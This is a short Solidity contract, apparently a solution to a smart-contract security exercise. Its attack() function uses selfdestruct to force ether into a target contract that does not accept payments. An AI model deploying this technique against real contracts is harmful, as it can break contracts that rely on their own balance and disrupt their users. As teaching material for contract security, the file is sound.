pragma solidity ^0.6.0;

contract ForceAttacker {

  address force;

  constructor(address _force) public {
    force = _force;
  }

  function attack() public payable {
    address payable forcePayable = payable(address(force));
    // This will self destruct and send to the force contract
    selfdestruct(forcePayable);
  }

}
